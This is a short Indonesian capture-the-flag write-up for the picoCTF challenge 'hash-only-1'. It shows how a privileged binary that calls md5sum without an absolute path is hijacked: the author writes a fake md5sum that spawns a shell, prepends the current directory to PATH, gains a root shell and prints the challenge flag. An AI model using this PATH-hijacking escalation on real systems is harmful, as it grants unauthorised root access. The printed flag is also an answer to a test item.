# hash-only-1
## problem
Program memiliki previllage yang cukup untuk mengambil flag di /root/flag.txt, setelah itu program akan mengeluarkan hasil hash menggunakan md dari isi flag tersebut
## diketahui
* Program menggunakan program lain berupa md5 tanpa melalui absolut path, dengan bukti:
```
baba@192:~/Documents/picoctf/hash-only-1$ strings flaghasher  | grep -i md5
Computing the MD5 hash of /root/flag.txt.... 
/bin/bash -c 'md5sum /root/flag.txt'
```
* Kita memiliki previllage yang cukup untuk menulis suatu program dan membuka executeable permissionnya

## Solusi
* membuat md5sum palsu:
```
echo -e '#!/bin/bash\nsh' > md5sum
```
* menjalankan program dengan environment current directory
```
PATH=.:$PATH ./flaghasher
```
* Menjelajahi host dengan bebas
```
Computing the MD5 hash of /root/flag.txt.... 

# ls
flaghasher  md5sum
# cd / 	
# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev	 home  lib32  libx32  mnt    proc  run	 srv   tmp  var
# cd root
# ls
flag.txt
# cat flag.txt
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_bb95ff8e}# exit
ctf-player@pico-chall$ exit
logout

```